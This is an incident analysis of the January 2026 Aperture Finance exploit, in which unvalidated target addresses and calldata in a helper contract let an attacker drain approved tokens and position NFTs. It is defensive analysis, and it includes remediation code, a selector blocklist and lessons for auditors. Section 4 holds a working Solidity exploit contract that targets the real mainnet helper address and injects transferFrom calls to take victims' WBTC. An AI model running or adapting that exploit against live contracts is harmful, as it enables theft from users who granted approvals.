# Aperture Finance — Unverified User Input Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2026-01-25 |
| **Protocol** | Aperture Finance (Uniswap V3/V4 Liquidity Management Protocol) |
| **Chain** | Ethereum (+ Arbitrum, Base — Multi-chain attack) |
| **Loss** | $3,670,000 (WBTC, ETH, USDC, and multiple ERC-20 tokens and NFT positions) |
| **Attacker** | [0xe3e7...8ea](https://etherscan.io/address/0xe3e73f1e6ace2b27891d41369919e8f57129e8ea) |
| **Attack Contract** | [0x5c92...8130](https://etherscan.io/address/0x5c92884dFE0795db5ee095E68414d6aaBf398130) |
| **Attack Tx** | [0x8f28...25a](https://etherscan.io/tx/0x8f28a7f604f1b3890c2275eec54cd7deb40935183a856074c0a06e4b5f72f25a) |
| **Vulnerable Contract** | [0xD83d...913](https://etherscan.io/address/0xD83d960deBEC397fB149b51F8F37DD3B5CFA8913) |
| **Root Cause** | Unvalidated target address and calldata in low-level external calls within the helper module — arbitrary fund theft |
| **References** | [BlockSec Analysis](https://blocksec.com/blog/17m-closed-source-smart-contract-exploit-arbitrary-call-swapnet-aperture) · [SolidityScan Analysis](https://blog.solidityscan.com/aperture-finance-hack-analysis-22dca439ff33) |

---

## 1. Vulnerability Overview

Aperture Finance is a DeFi protocol that automatically manages Uniswap V3/V4 liquidity positions. Users grant approvals (`approve`) over ERC-20 tokens and ERC-721 liquidity position NFTs to the protocol's helper contract, allowing the protocol to rebalance positions and execute swaps.

On January 25, 2026, an attacker exploited an **Unverified User Input** vulnerability in Aperture Finance's internal helper module to steal $3,670,000 worth of assets. This was carried out by the same attacker responsible for the SwapNet exploit ($13.41M) on the same day, applying the identical attack pattern across both protocols in succession.

**Key Vulnerability Summary**:

- ❌ The internal swap helper function (`0x67b34120()` / `0x1d33()`) passes user-controlled parameters (`target`, `calldata`) to a low-level call without any validation
- ❌ The call target address is not checked against an allowlist of approved DEX routers, allowing it to be replaced with a token contract address
- ❌ The function selector in the calldata is not validated, allowing injection of dangerous functions such as `transferFrom`
- ❌ The balance validation logic (`expectedOutput`) can be bypassed via an attacker-controlled parameter
- ⚠️ The contract was deployed without source code verification, preventing prior code review

**Nature of the Attack**:
- No flash loan required — exploits only existing user approvals
- Attack can be triggered with as little as 100 wei ETH
- Both ERC-20 tokens and Uniswap V3 position NFTs are drainable

---

## 2. Vulnerable Code Analysis

### 2.1 Swap Helper Function — Unvalidated Arbitrary External Call (Core Vulnerability)

The vulnerable contract (`0xD83d...913`) was deployed without verified source code. The vulnerable structure is reconstructed based on bytecode reverse-engineering analysis by BlockSec and SolidityScan.

```solidity
// ❌ Vulnerable code (inferred — source unverified, based on bytecode reverse engineering)
// Aperture Finance helper module — function selector: 0x67b34120 / 0x1d33

function swapHelper(
    address target,          // ❌ External call target — user-controlled, no validation
    bytes calldata callData, // ❌ External call data — user-controlled, no validation
    uint256 expectedOutput   // ❌ Balance validation baseline — attacker can set to 0
) external payable {
    // Step 1: Wrap small amount of ETH into WETH (attack trigger only)
    WETH.deposit{value: msg.value}();   // 100 wei ETH → WETH

    // Step 2: Core vulnerability — low-level call with user-supplied target/callData
    // ❌ Does not validate whether target is an approved DEX router
    // ❌ Does not validate whether the function selector in callData is dangerous
    (bool success, ) = target.call(callData);
    require(success, "External call failed");

    // Step 3: Balance validation — bypassed if expectedOutput is 0
    // ❌ Attacker sets expectedOutput=0 to nullify the check
    uint256 currentBalance = IERC20(outputToken).balanceOf(address(this));
    require(currentBalance >= expectedOutput, "Insufficient output");

    // Step 4: Mint Uniswap position (disguised as normal flow after attack completes)
    INonfungiblePositionManager.MintParams memory params = /* ... */;
    positionManager.mint(params);
}
```

**The Problem**: When `target.call(callData)` is invoked, neither the target address nor the calldata is validated in any way. An attacker can set `target` to the WBTC token contract address and inject `transferFrom(victim, attacker, amount)` encoding into `callData`. Since the Aperture Finance helper contract holds an approval from the victim, this `transferFrom` call succeeds. The balance check is then bypassed by setting `expectedOutput=0`.

```solidity
// ✅ Fixed code — call target allowlist + selector blocking + enhanced balance validation

// Allowlist of approved DEX router addresses
mapping(address => bool) public approvedTargets;

// Blocked list of dangerous function selectors (token transfer-related)
bytes4 constant TRANSFER_FROM_SEL = bytes4(keccak256("transferFrom(address,address,uint256)"));
bytes4 constant APPROVE_SEL       = bytes4(keccak256("approve(address,uint256)"));
bytes4 constant TRANSFER_SEL      = bytes4(keccak256("transfer(address,uint256)"));
// Dangerous ERC-721 selectors
bytes4 constant TRANSFER_NFT_SEL        = bytes4(keccak256("transferFrom(address,address,uint256)"));
bytes4 constant SAFE_TRANSFER_NFT_SEL   = bytes4(keccak256("safeTransferFrom(address,address,uint256)"));
bytes4 constant SET_APPROVAL_ALL_SEL    = bytes4(keccak256("setApprovalForAll(address,bool)"));

function swapHelper(
    address target,
    bytes calldata callData,
    uint256 expectedOutput
) external payable {
    // ✅ Check 1: Verify target is on the approved DEX router allowlist
    require(approvedTargets[target], "ApertureFinance: Unapproved call target");

    // ✅ Check 2: Block dangerous function selectors
    if (callData.length >= 4) {
        bytes4 sel = bytes4(callData[:4]);
        require(
            sel != TRANSFER_FROM_SEL &&
            sel != APPROVE_SEL &&
            sel != TRANSFER_SEL &&
            sel != SAFE_TRANSFER_NFT_SEL &&
            sel != SET_APPROVAL_ALL_SEL,
            "ApertureFinance: Forbidden function selector"
        );
    }

    WETH.deposit{value: msg.value}();

    (bool success, ) = target.call(callData);
    require(success, "External call failed");

    // ✅ Check 3: Enforce minimum expectedOutput (cannot be bypassed with 0)
    require(expectedOutput > 0, "ApertureFinance: expectedOutput cannot be zero");
    uint256 currentBalance = IERC20(outputToken).balanceOf(address(this));
    require(currentBalance >= expectedOutput, "ApertureFinance: Insufficient balance");

    positionManager.mint(/* params */);
}
```

### 2.2 ERC-721 Position NFT Theft Vector

In addition to draining ERC-20 tokens, the attacker could exploit the same vulnerability to steal Uniswap V3 position NFTs.

```solidity
// ❌ NFT theft attack scenario
// callData = NonfungiblePositionManager.safeTransferFrom(victim, attacker, tokenId)
// target   = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88 (Uniswap V3 Position Manager)
// Succeeds if victim has granted setApprovalForAll(true) to the Aperture Finance helper
```

---

## 3. Attack Flow

### 3.1 Prerequisites

- Victim has granted an ERC-20 token approval (`approve`) or full ERC-721 position NFT approval (`setApprovalForAll`) to the Aperture Finance helper contract (`0xD83d...913`)
- Attacker has pre-deployed the attack contract (`0x5c92...8130`)
- Attacker holds a small amount of ETH (100 wei) to trigger the attack

### 3.2 Execution Steps

1. **[Step 1] Target Selection**: Attacker collects, from on-chain event logs, a list of addresses that have granted large approvals to the helper contract
2. **[Step 2] Craft Malicious Parameters**: Set `target = WBTC token address`, `callData = transferFrom(victim, attacker, balance)`, `expectedOutput = 0`
3. **[Step 3] Call the Attack Function**: Attack contract calls the helper's swap function (`0x67b34120()`), sending 100 wei ETH
4. **[Step 4] WETH Wrapping**: Helper wraps 100 wei ETH into WETH (enters normal execution flow)
5. **[Step 5] Execute Arbitrary External Call**: Helper executes `WBTC.transferFrom(victim, attacker, amount)` without validation
6. **[Step 6] Bypass Balance Check**: `expectedOutput=0` causes balance validation to pass
7. **[Step 7] Mint Uniswap Position**: Normal position minting concludes execution as a disguise
8. **[Step 8] Money Laundering**: 1,242 ETH worth (~$2.4M) of stolen funds are deposited into Tornado Cash

### 3.3 Attack Flow Diagram

```
═══════════════════════════════════════════════════════════════════

  ┌──────────────────────────────────┐
  │   Attacker EOA                    │
  │  0xe3e7...8ea                     │
  │  (holds 100 wei ETH)              │
  └────────────────┬─────────────────┘
                   │ (1) Deploy & call attack contract
                   ▼
  ┌──────────────────────────────────┐
  │   Attack Contract                 │
  │  0x5c92...8130                   │
  │                                  │
  │  target   = WBTC token address   │
  │  callData = transferFrom(        │
  │    victim, attacker, balance)    │
  │  expected = 0 (bypass check)     │
  └────────────────┬─────────────────┘
                   │ (2) Call 0x67b34120() + 100 wei ETH
                   │     [swapHelper(target, callData, 0)]
                   ▼
  ┌────────────────────────────────────────────────────────────┐
  │              Aperture Finance Helper Contract               │
  │           0xD83d...913 (unverified source)                 │
  │                                                            │
  │  swapHelper() {                                            │
  │    ① WETH.deposit(100 wei)  ← enter normal flow          │
  │    ② ❌ Low-level call with no target validation:         │
  │       target.call(callData)                                │
  │       = WBTC.transferFrom(victim, attacker, amount)        │
  │    ③ ❌ expectedOutput=0 → balance check bypassed         │
  │    ④ positionManager.mint() ← disguised normal exit       │
  │  }                                                         │
  └────────────────────────────────────────────────────────────┘
          │                              │
          │ (3) WBTC.transferFrom()      │ (optional) NFT theft
          │     helper holds approval    │ safeTransferFrom()
          ▼                              ▼
  ┌────────────────────┐   ┌────────────────────────────┐
  │   WBTC Token       │   │  Uniswap V3 Position Mgr  │
  │   Contract         │   │  0xC364...Fe88              │
  │                    │   │                            │
  │  transferFrom exec │   │  safeTransferFrom exec     │
  │  (allowance met    │   │  (setApprovalForAll held)  │
  │   → succeeds)      │   │                            │
  └──────────┬─────────┘   └───────────┬────────────────┘
             │                         │
             │ (4) Victim's WBTC       │ (4) Victim's NFT position
             │     → transferred to    │     → transferred to
             │       attacker          │       attacker
             └────────────┬────────────┘
                          ▼
  ┌────────────────────────────────────┐
  │   Attacker Wallet                   │
  │   Receives $3,670,000 in assets     │
  │   (WBTC, ETH, USDC, NFT positions) │
  └────────────────────┬───────────────┘
                       │ (5) 1,242 ETH → Tornado Cash laundering
                       ▼
  ┌────────────────────────────────────┐
  │   Tornado Cash (Ethereum Mainnet)   │
  │   ~$2.4M laundered                  │
  └────────────────────────────────────┘

  ※ Same pattern repeated on Arbitrum and Base in addition to Ethereum
  ※ Same attacker and same date as the SwapNet attack ($13.41M)

═══════════════════════════════════════════════════════════════════
```

### 3.4 Outcome

- **Attacker Profit**: ~$3,670,000 (including WBTC, ETH, USDC, and Uniswap V3 NFT positions)
- **Money Laundering**: 1,242 ETH ($2.4M) deposited into Tornado Cash
- **Aperture Finance Response**: Immediately suspended core frontend functionality; issued urgent notice for users to revoke ERC-20 and ERC-721 approvals

---

## 4. PoC Core Logic (Reproduction)

No public DeFiHackLabs PoC is available; the core attack logic is reproduced based on technical analysis.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Aperture Finance Unverified User Input Attack Reproduction
// Chain: Ethereum Mainnet
// Attack Tx: 0x8f28a7f6...25a

interface IApertureHelper {
    // Vulnerable function — selector: 0x67b34120
    function swapHelper(
        address target,          // ❌ Call target — no validation
        bytes calldata callData, // ❌ Calldata — no validation
        uint256 expectedOutput   // ❌ Balance baseline — bypassable with 0
    ) external payable;
}

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract ApertureExploit {
    // Aperture Finance helper contract (vulnerable contract)
    IApertureHelper constant HELPER =
        IApertureHelper(0xD83d960deBEC397fB149b51F8F37DD3B5CFA8913);

    // Target token to drain (e.g., WBTC)
    IERC20 constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    function exploit(address[] calldata victims) external payable {
        for (uint256 i = 0; i < victims.length; i++) {
            address victim = victims[i];

            // [Step 1] Query victim's approval balance for the helper contract
            uint256 allowance = WBTC.allowance(victim, address(HELPER));
            uint256 balance   = WBTC.balanceOf(victim);

            // [Step 2] Calculate actual drainable amount
            uint256 amount = allowance < balance ? allowance : balance;
            if (amount == 0) continue;

            // [Step 3] Assemble malicious calldata
            // target = WBTC token contract address (not a DEX router!)
            address maliciousTarget = address(WBTC);

            // callData = transferFrom(victim, attacker, full approved balance)
            bytes memory maliciousCallData = abi.encodeWithSelector(
                IERC20.transferFrom.selector,
                victim,        // from: victim
                address(this), // to: attacker contract
                amount         // amount: victim's full approved balance
            );

            // [Step 4] Call swap helper
            // - Helper executes WBTC.transferFrom(victim, attacker, amount)
            // - expectedOutput=0 bypasses balance validation
            HELPER.swapHelper{value: 100}(  // 100 wei ETH (for WETH wrapping)
                maliciousTarget,              // ❌ Replaced with WBTC address
                maliciousCallData,            // ❌ transferFrom injected
                0                             // ❌ Balance check bypassed
            );
            // [Result] Victim's WBTC transferred to attacker contract
        }
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Arbitrary External Call (Unvalidated Call Target) | CRITICAL | CWE-20 (Improper Input Validation) | `03_access_control.md` | Dexible (2023-02), SushiSwap (2023-04), SwapNet (2026-01) |
| V-02 | Dangerous Function Selector Not Blocked | CRITICAL | CWE-285 (Improper Authorization) | `07_token_integration.md` | Socket Gateway (2024-01), Seneca (2024-02) |
| V-03 | Balance Validation Logic Bypass (`expectedOutput=0`) | HIGH | CWE-693 (Protection Mechanism Failure) | `11_logic_error.md` | — |
| V-04 | ERC-721 NFT Approval Theft | HIGH | CWE-284 (Improper Access Control) | `13_nft_vulnerabilities.md` | ParaSpace (2023-03) |
| V-05 | Deployment Without Source Code Verification | MEDIUM | CWE-656 (Reliance on Security Through Obscurity) | — | SwapNet (2026-01) |

### V-01: Arbitrary External Call (Unvalidated Call Target)

- **Description**: The swap function in the helper module executes a user-supplied `target` address via a low-level `.call()` without any validation. An attacker can set `target` to an arbitrary token contract rather than an approved DEX router.
- **Impact**: The entire token balance of every user who has granted an ERC-20 approval to the helper contract can be stolen. Executable with only 100 wei ETH and no flash loan; losses scale unboundedly with the number of victims.
- **Attack Conditions**: ① Victim has granted an ERC-20 token `approve` to the helper contract; ② Attacker can call the swap helper function with arbitrary parameters

### V-02: Dangerous Function Selector Not Blocked

- **Description**: There is no logic to extract the function selector from the user-supplied `callData` and block token transfer-related functions such as `transferFrom`, `approve`, `transfer`, and `setApprovalForAll`. Combined with V-01, this forms a complete attack vector.
- **Impact**: Dangerous function injection is possible even against approved target addresses. The absence of defense-in-depth means bypassing a single check collapses all defenses.
- **Attack Conditions**: Same as V-01

### V-03: Balance Validation Logic Bypass

- **Description**: The `expectedOutput` parameter, which verifies the output token balance after a swap, can be set to 0 by the user. This completely nullifies the "swap result validation" safety mechanism.
- **Impact**: An attacker can pass validation and have the function exit normally even without executing an actual swap — only the arbitrary external call runs.
- **Attack Conditions**: Used together with V-01 to complete the balance check bypass

### V-04: ERC-721 NFT Approval Theft

- **Description**: If a victim has granted `setApprovalForAll(true)` to Aperture Finance for their Uniswap V3 position NFTs, the same arbitrary external call vulnerability can be used to steal NFT positions as well.
- **Impact**: Extends the damage beyond ERC-20 token theft to include liquidity position NFTs. Since NFT positions contain token liquidity, the financial impact may exceed that of token theft alone.
- **Attack Conditions**: Victim has granted a `setApprovalForAll` approval to the helper contract

### V-05: Deployment Without Source Code Verification

- **Description**: The vulnerable helper contract was deployed without having its source code verified on a block explorer, preventing the community and security researchers from reviewing the code in advance.
- **Impact**: The vulnerability was not discovered beforehand, and post-incident analysis and patching were also delayed.
- **Attack Conditions**: Attacker possesses bytecode decompilation skills or exploits insider knowledge

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Enforce approved DEX router allowlist
mapping(address => bool) public approvedSwapTargets;

// Only admin (or governance) can register approved targets
function setApprovedTarget(address target, bool approved) external onlyOwner {
    approvedSwapTargets[target] = approved;
    emit SwapTargetUpdated(target, approved);
}

// ✅ Fix 2: Define dangerous selector blocklist
bytes4 constant TRANSFER_FROM_SEL    = 0x23b872dd; // transferFrom(address,address,uint256)
bytes4 constant APPROVE_SEL          = 0x095ea7b3; // approve(address,uint256)
bytes4 constant TRANSFER_SEL         = 0xa9059cbb; // transfer(address,uint256)
bytes4 constant SAFE_TRANSFER_FROM_SEL = 0x42842e0e; // safeTransferFrom(address,address,uint256)
bytes4 constant SET_APPROVAL_ALL_SEL   = 0xa22cb465; // setApprovalForAll(address,bool)

// ✅ Fix 3: Add all validations to swapHelper
function swapHelper(
    address target,
    bytes calldata callData,
    uint256 expectedOutput
) external payable nonReentrant {
    // Check 1: Verify target address against allowlist
    require(approvedSwapTargets[target], "ApertureFinance: Unapproved call target");

    // Check 2: Block dangerous function selectors (enforce minimum 4-byte calldata)
    require(callData.length >= 4, "ApertureFinance: Calldata too short");
    bytes4 sel = bytes4(callData[:4]);
    require(
        sel != TRANSFER_FROM_SEL &&
        sel != APPROVE_SEL &&
        sel != TRANSFER_SEL &&
        sel != SAFE_TRANSFER_FROM_SEL &&
        sel != SET_APPROVAL_ALL_SEL,
        "ApertureFinance: Forbidden function selector"
    );

    // Check 3: Enforce minimum expectedOutput (block 0 bypass)
    require(expectedOutput > 0, "ApertureFinance: expectedOutput cannot be zero");

    WETH.deposit{value: msg.value}();

    (bool success, ) = target.call(callData);
    require(success, "ApertureFinance: External call failed");

    // Check 4: Balance validation after swap (performed after reentrancy guard)
    uint256 currentBalance = IERC20(outputToken).balanceOf(address(this));
    require(currentBalance >= expectedOutput, "ApertureFinance: Insufficient output balance");

    positionManager.mint(/* params */);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Arbitrary External Call | Introduce DEX router address allowlist, governance-based list management, regular audits |
| V-02 Dangerous Selector Not Blocked | Explicitly block `transferFrom`, `approve`, `transfer`, `setApprovalForAll` selectors; consider adopting an allowed-selector allowlist approach |
| V-03 Balance Validation Bypass | Enforce `expectedOutput > 0`; require a minimum value within an acceptable slippage range |
| V-04 ERC-721 Theft | Isolate NFT-related approvals into a separate module; apply principle of least privilege |
| V-05 Unverified Source Code | Mandate source code verification on Etherscan/Arbiscan before deployment; publish audit reports |
| General | Adopt EIP-2612 Permit or Permit2 to move away from infinite approval patterns; encourage minimal approval UX |
| General | Strengthen emergency pause (Pausable) mechanisms; build automated anomalous transaction detection and alerting systems |

---

## 7. Lessons Learned

1. **Arbitrary external calls are the most dangerous design pattern in DeFi**: When aggregator or helper contracts execute user-controlled addresses and calldata without validation, every user approval granted to that contract (ERC-20 `approve`, ERC-721 `setApprovalForAll`) becomes an attack vector. External call targets must be restricted to an admin-approved allowlist.

2. **Designs that rely on a single safeguard are dangerous**: The `expectedOutput` balance check was intended to guarantee that a swap executed correctly, but the fact that this value itself could be set to 0 by the user nullified the defense entirely. Defense must always be layered (call target validation + selector validation + balance validation).

3. **ERC-721 approvals are as dangerous as ERC-20 approvals**: A `setApprovalForAll` grant over Uniswap V3 position NFTs carries the same risk as an ERC-20 `approve`. Liquidity management protocols must isolate NFT-related permissions into a separate module and apply the principle of least privilege.

4. **Infinite approval structures amplify damage**: Infinite approvals granted by users for convenience expose their entire holdings when a vulnerability occurs. Protocols should adopt single-use approval mechanisms like Permit2 or EIP-2612, or design UX that requests only the minimum amount needed per swap.

5. **Source code verification is a basic security requirement**: Unverified contracts block community auditing and eliminate the opportunity for early vulnerability discovery. All production contracts must have their source code verified and published on a block explorer before or immediately after deployment.

6. **The same vulnerability can affect multiple protocols simultaneously**: Aperture Finance and SwapNet were attacked on the same day by the same attacker using the same pattern (arbitrary external call). Because a single vulnerability pattern can be present across multiple protocols in the ecosystem, when a DeFi security incident occurs, protocols with similar architectures must immediately conduct self-assessments.

7. **Audit Focus Areas**: When auditing liquidity management or swap helper contracts, parameters related to external calls — such as `target`, `calldata`, `data`, `path`, and `payload` — must be the top priority for review. In particular, when such parameters are received directly from external input and passed to `.call()`, `.delegatecall()`, etc., auditors must verify the presence of allowlist validation and selector blocking.

---

## 8. On-Chain Verification

> This analysis is based on publicly available technical reports from BlockSec, SolidityScan, and on-chain data.

### 8.1 PoC vs. On-Chain Amount Comparison

| Field | Value | Source | Notes |
|------|-----|------|------|
| Total Loss | $3,670,000 | BlockSec, SolidityScan | Combined: Ethereum + Arbitrum + Base |
| ETH into Tornado Cash | 1,242 ETH (~$2.4M) | On-chain tracing | Partial laundering of total loss confirmed |
| Attack Transaction | 0x8f28...25a | Etherscan | Representative Ethereum Tx |
| Vulnerable Contract | 0xD83d...913 | Etherscan | Source code unverified |
| Combined Loss incl. SwapNet | ~$17,080,000 | BlockSec | Same attacker, same date |

### 8.2 Attack Timeline

| Time (UTC, estimated) | Event | Chain |
|-----------------|--------|------|
| 2026-01-25 | Initial attack transaction executed | Ethereum |
| 2026-01-25 | Same pattern attack on Arbitrum and Base | Arbitrum, Base |
| 2026-01-25 | Aperture Finance frontend functionality suspended | — |
| 2026-01-25 | Emergency notice issued for users to revoke ERC-20/ERC-721 approvals | — |
| 2026-01-27 | 1,242 ETH laundered via Tornado Cash | Ethereum |

### 8.3 Key Attack Parameters (On-Chain Confirmed)

```
Vulnerable function:    0x67b34120() / internal 0x1d33()
Call target swap:       Approved DEX address → ERC-20 token contract address (e.g., WBTC)
Malicious calldata:     transferFrom(victim_address, attacker_address, approved_balance)
Balance check bypass:   expectedOutput = 0
Attack success condition: allowance[victim][helper] > 0 AND balanceOf(victim) > 0
```

### 8.4 Similar Attack Pattern Comparison

| Protocol | Date | Loss | Vulnerable Function | Pattern |
|---------|------|------|----------|------|
| Dexible | 2023-02-17 | $1.5M | `selfSwap()` | Arbitrary router address |
| SushiSwap | 2023-04-09 | $3.3M | `processRoute()` | Arbitrary call target |
| Socket Gateway | 2024-01 | $3.3M | `performAction()` | Arbitrary external call |
| Seneca | 2024-02 | $6.5M | `performOperations()` | Arbitrary external call |
| SwapNet | 2026-01-25 | $13.4M | `0x87395540()` | Arbitrary call target |
| Aperture Finance | 2026-01-25 | $3.67M | `0x67b34120()` | Unverified input |

---

*Authored: 2026-04-11 | Analysis basis: BlockSec · SolidityScan public reports | Pattern references: 03_access_control.md, 07_token_integration.md, 13_nft_vulnerabilities.md*